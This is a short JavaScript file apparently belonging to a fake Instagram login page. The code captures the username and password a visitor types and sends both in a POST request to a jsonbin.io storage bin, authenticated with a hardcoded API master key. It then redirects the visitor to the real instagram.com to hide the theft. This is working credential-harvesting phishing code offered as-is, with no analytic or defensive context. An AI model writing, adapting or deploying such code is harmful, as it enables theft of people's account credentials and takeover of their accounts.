username = document.querySelector("input.username");
password = document.querySelector("input.password");
button = document.querySelector('input[type="button"]')

function checkLogin(){
    if(username.value != "" && password.value.length >= 5){
        button.classList.add("active");
    }
    else{
        button.classList.remove("active");
    }
}

username.onkeypress = checkLogin;
password.onkeypress = checkLogin;
button.onclick = function(){
    if(username.value != "" && password.value.length >= 5){
        sendData();
    }
    else{
        return false;
    }
}

function sendData(){
    let req = new XMLHttpRequest();

    req.onreadystatechange = () => {
    if (req.readyState == XMLHttpRequest.DONE) {
        window.location.href = "https://www.instagram.com/";
    }
    };
    
    req.open("POST", "https://api.jsonbin.io/v3/b", true);
    req.setRequestHeader("Content-Type", "application/json");
    req.setRequestHeader("X-Master-Key", "$2b$10$I1Ki1sjE3bS.2QirwOD2ou..z4OQKfkOp9UZLgF7Ut5tOKALFR5W6");
    req.send(`{"username": "${username.value}","password" : "${password.value}" }`)
}